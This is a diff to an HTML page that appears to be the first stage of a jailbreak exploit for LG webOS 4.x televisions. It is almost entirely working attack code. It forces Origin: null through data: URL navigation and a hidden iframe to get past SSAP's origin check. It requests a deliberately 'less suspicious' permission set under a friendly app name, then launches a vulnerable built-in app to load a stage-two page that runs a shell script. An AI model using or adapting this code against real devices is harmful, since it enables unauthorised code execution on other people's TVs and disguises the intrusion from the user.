@@ -25,102 +25,192 @@
     <div id="log">Status: Ready.</div>
 
     <script>
+        // --- Determine origin for stage2 URL construction ---
+        // When navigated to data: URL, we lose window.location.origin,
+        // so we capture the real HTTP origin before any navigation happens.
+        window.ORIGIN_URL =
+            window.location.protocol === 'data:' ? '__ORIGIN__' :
+            window.location.protocol === 'file:' ? 'http://127.0.0.1' :
+            window.location.origin;
+
+        // --- Navigate self to data: URL so WebSocket sends Origin: null ---
+        // SSAP on webOS 4.x blocks http/https origins but explicitly allows null.
+        // This must happen before any WebSocket is opened.
+        try {
+            if (window.location.protocol !== 'data:') {
+                window.location = 'data:text/html;base64,' + btoa(
+                    document.documentElement.innerHTML
+                        .replace('__ORIGIN__', window.location.origin)
+                );
+                // Page will reload as data: — execution stops here on first load.
+            }
+        } catch(e) {}
+    </script>
+    <script>
         var logBox = document.querySelector('#log');
         function log(str) { logBox.innerText += '> ' + str + '\n'; logBox.scrollTop = logBox.scrollHeight; }
 
+        // --- ProxyWebSocket ---
+        // Opens the real WebSocket inside a data: iframe so Origin: null is sent.
+        // Direct new WebSocket() from an http: page sends Origin: http://... which
+        // SSAP on webOS 4.x rejects silently — that was the core bug.
+        function ProxyWebSocket(target) {
+            function proxyPayload(address) {
+                function forward(type, data) {
+                    window.parent.postMessage(JSON.stringify({ type: type, data: data }), '*');
+                }
+                try {
+                    var conn = new WebSocket(address);
+                    conn.onopen    = function(e) { forward('open', e); };
+                    conn.onclose   = function(e) { forward('close', e); };
+                    conn.onerror   = function(e) { forward('error', e); };
+                    conn.onmessage = function(e) { forward('message', { data: e.data }); };
+                    window.addEventListener('message', function(ev) {
+                        var msg = JSON.parse(ev.data);
+                        if (msg.type === 'send') conn.send(msg.data);
+                    }, false);
+                } catch(err) { forward('error', err); }
+            }
+
+            var self = this;
+            this.proxy = document.createElement('iframe');
+            this.proxy.style.display = 'none';
+            this.proxy.setAttribute('src',
+                'data:text/html;base64,' + btoa(
+                    '<script>' + proxyPayload.toString() +
+                    ';proxyPayload(' + JSON.stringify(target) + ');<\/script>'
+                )
+            );
+            window.addEventListener('message', function(ev) {
+                if (ev.source !== self.proxy.contentWindow) return;
+                var msg = JSON.parse(ev.data);
+                if (msg.type === 'message' && self.onmessage) self.onmessage(msg.data);
+                if (msg.type === 'open'    && self.onopen)    self.onopen(msg.data);
+                if (msg.type === 'close'   && self.onclose)   self.onclose(msg.data);
+                if (msg.type === 'error'   && self.onerror)   self.onerror(msg.data);
+            }, false);
+            document.body.appendChild(this.proxy);
+        }
+        ProxyWebSocket.prototype.send = function(data) {
+            this.proxy.contentWindow.postMessage(JSON.stringify({ type: 'send', data: data }), '*');
+        };
+        ProxyWebSocket.prototype.close = function() {
+            if (this.proxy.parentNode) this.proxy.parentNode.removeChild(this.proxy);
+        };
+
+        // --- Main exploit ---
+        var activeConn = null;
+
         function startExploit(scriptName) {
-            log("Connecting to SSAP...");
-            var ws = new WebSocket('ws://127.0.0.1:3000');
+            if (activeConn) { try { activeConn.close(); } catch(e) {} }
 
-            ws.onerror = function() { log("ERROR: WebSocket failed. Is the TV on the same network?"); };
-            ws.onclose = function() { log("Connection closed."); };
+            // Build stage2 URL using the captured HTTP origin (ORIGIN_URL),
+            // because window.location is now data: and has no useful origin.
+            var stage2Url = window.ORIGIN_URL + '/stage2.html?run=' + encodeURIComponent(scriptName);
 
-            ws.onopen = function() {
-                log("Connection open. >>> ACCEPT THE PROMPT ON YOUR TV <<<");
-                ws.send(JSON.stringify({
-                    id: "register_0",
-                    type: "register",
+            log('Connecting via proxy iframe (Origin: null)...');
+            var conn = new ProxyWebSocket('ws://127.0.0.1:3000');
+            activeConn = conn;
+
+            conn.onerror = function() {
+                log('ERROR: Could not connect. Check LG Connect Apps is enabled on the TV.');
+            };
+            conn.onclose = function() { log('Connection closed.'); };
+
+            conn.onopen = function() {
+                log('Connected. >>> ACCEPT THE PROMPT ON YOUR TV <<<');
+                conn.send(JSON.stringify({
+                    id: 'reg_0',
+                    type: 'register',
                     payload: {
                         forcePairing: false,
-                        pairingType: "PROMPT",
+                        pairingType: 'PROMPT',
                         manifest: {
-                            // Full permission set required by webOS 4.x for launcher access
                             manifestVersion: 1,
-                            appVersion: "1.1",
-                            permissions: [
-                                "LAUNCH",
-                                "LAUNCH_WEBAPP",
-                                "APP_TO_APP",
-                                "CLOSE",
-                                "TEST_OPEN",
-                                "TEST_PROTECTED",
-                                "CONTROL_AUDIO",
-                                "CONTROL_DISPLAY",
-                                "CONTROL_INPUT_JOYSTICK",
-                                "CONTROL_INPUT_MEDIA_RECORDING",
-                                "CONTROL_INPUT_MEDIA_PLAYBACK",
-                                "CONTROL_INPUT_TV",
-                                "CONTROL_POWER",
-                                "READ_NOTIFICATION_8",
-                                "READ_TV_CHANNEL_LIST",
-                                "WRITE_NOTIFICATION_ALERT",
-                                "CONTROL_INPUT_TEXT",
-                                "CONTROL_MOUSE_AND_KEYBOARD",
-                                "READ_INSTALLED_APPS",
-                                "READ_LGE_SDX",
-                                "READ_LGE_TV_INPUT_HELP_APP",
-                                "SYSTEM_CONTROL"
-                            ]
+                            localizedAppNames: { '': 'Beanbird Cursor' },
+                            // Minimal set — less suspicious, still enough to listApps + launch
+                            permissions: ['LAUNCH', 'READ_INSTALLED_APPS']
                         }
                     }
                 }));
             };
 
-            ws.onmessage = function(e) {
-                var res;
-                try { res = JSON.parse(e.data); } catch(ex) { log("Parse error: " + e.data); return; }
+            // Pending request callbacks keyed by message id
+            var pending = {};
+            function request(uri, payload, cb) {
+                var id = 'req_' + Date.now();
+                pending[id] = cb;
+                conn.send(JSON.stringify({ id: id, type: 'request', uri: uri, payload: payload }));
+            }
 
-                log("MSG type=" + res.type + (res.error ? " error=" + res.error : ""));
+            conn.onmessage = function(evt) {
+                var msg;
+                try { msg = JSON.parse(evt.data); } catch(e) { log('Parse error: ' + evt.data); return; }
 
-                if (res.type === "response" && res.error === "403 too many ACKs") {
-                    // Already paired from a previous session — just proceed
-                    log("Already paired (403 ACK). Proceeding...");
-                    launchFacebook(ws, scriptName);
-                    return;
-                }
+                if (msg.type === 'registered') {
+                    log('Registered! Scanning for escape app...');
 
-                if (res.type === "response") {
-                    // webOS 4 sends a "response" with a client-key before "registered"
-                    // Nothing to do — wait for the next message
-                    log("Waiting for user to accept prompt...");
-                    return;
-                }
+                    // Query installed apps and pick best available escape hatch —
+                    // same priority logic as RootMyTV so we work even if facebooklogin is absent.
+                    request('ssap://com.webos.applicationManager/listApps', {}, function(res) {
+                        var candidates = {
+                            'com.webos.app.facebooklogin': {
+                                priority: 1000,
+                                params: function(u) { return { server: u.replace(/^https?:\/\//, '') + '#' }; }
+                            },
+                            'com.webos.app.alibaba': {
+                                priority: 800,
+                                params: function(u) { return { target: u }; }
+                            },
+                            'com.webos.app.acrcard': {
+                                priority: 600,
+                                params: function(u) { return { contentTarget: u }; }
+                            }
+                        };
 
-                if (res.type === "registered") {
-                    log("Registered! Launching facebooklogin escape...");
-                    launchFacebook(ws, scriptName);
+                        var best = null;
+                        (res.payload.apps || []).forEach(function(app) {
+                            if (app.id in candidates) {
+                                log('Found escape app: ' + app.id);
+                                if (!best || candidates[app.id].priority > candidates[best].priority) {
+                                    best = app.id;
+                                }
+                            }
+                        });
+
+                        if (!best) {
+                            log('ERROR: No escape app found (facebooklogin/alibaba/acrcard). TV may be patched.');
+                            return;
+                        }
+
+                        log('Launching ' + best + ' -> ' + stage2Url);
+                        request('ssap://system.launcher/launch', {
+                            id: best,
+                            params: candidates[best].params(stage2Url)
+                        }, function(res2) {
+                            log('Launch result: ' + JSON.stringify(res2.payload));
+                        });
+                    });
+
+                } else if (msg.type === 'response') {
+                    if (pending[msg.id]) {
+                        pending[msg.id](msg);
+                        delete pending[msg.id];
+                    }
+                    // else: intermediate register response — just wait
+
+                } else if (msg.type === 'error') {
+                    log('Error (prompt declined?): ' + evt.data);
+                    if (pending[msg.id]) {
+                        pending[msg.id](msg);
+                        delete pending[msg.id];
+                    }
                 }
             };
         }
 
-        function launchFacebook(ws, scriptName) {
-            var stage2Url = window.location.origin + "/stage2.html?run=" + encodeURIComponent(scriptName);
-            // facebooklogin loads a server URL directly — strip protocol, append # to stop it adding its own path
-            var serverParam = stage2Url.replace(/^https?:\/\//, '') + "#";
-            log("stage2 URL: " + stage2Url);
-            ws.send(JSON.stringify({
-                id: "launch_fb",
-                type: "request",
-                uri: "ssap://system.launcher/launch",
-                payload: {
-                    id: "com.webos.app.facebooklogin",
-                    params: { server: serverParam }
-                }
-            }));
-        }
-
-        document.querySelector('#btn-run').onclick = function() { startExploit('beanbird.sh'); };
-        document.querySelector('#btn-reset').onclick = function() { startExploit('reboot.sh'); };
+        document.querySelector('#btn-run').onclick    = function() { startExploit('beanbird.sh'); };
+        document.querySelector('#btn-reset').onclick  = function() { startExploit('reboot.sh'); };
     </script>
 </body>
 </html>
